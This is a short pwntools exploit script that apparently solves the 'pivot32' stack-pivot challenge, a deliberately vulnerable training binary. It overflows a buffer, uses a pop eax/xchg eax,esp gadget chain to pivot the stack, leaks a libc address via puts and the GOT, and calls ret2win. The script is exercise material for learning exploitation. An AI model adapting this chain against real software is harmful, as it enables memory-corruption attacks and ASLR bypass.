from pwn import *

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
gdbscript = '''
break *0x08048816
continue
'''.format(**locals())

exe = './pivot32'
elf = context.binary = ELF(exe, checksec=False)
p = start()
libc = ELF("./libpivot32.so", checksec=False)
pop_eax = 0x0804882c
xchr_eax_esp = 0x0804882e

# ===== Exploit script here =====
p.recvuntil(b'pivot: '); leak = int(p.recvline(), 16)
info("Leak: " + hex(leak))
p.sendlineafter(b'> ', p32(elf.plt['foothold_function']) + p32(elf.entrypoint)) 
p.sendafter(b'> ', b'A'*44 + p32(pop_eax) + p32(leak) + p32(xchr_eax_esp))


p.recvuntil(b'pivot: '); leak = int(p.recvline(), 16)
info("Leak: " + hex(leak))
p.sendlineafter(b'> ', p32(elf.plt['puts']) + p32(elf.entrypoint) + p32(elf.got['foothold_function']) )  
p.sendafter(b'> ', b'A'*44 + p32(pop_eax) + p32(leak) + p32(xchr_eax_esp)); p.recvline()
leak_libc = u32(p.recv(4))
libc.address = leak_libc - libc.sym['foothold_function']


p.sendlineafter(b'> ', b'hehe') 
p.sendafter(b'> ', b'A'*44 + p32(libc.sym['ret2win']))
p.interactive()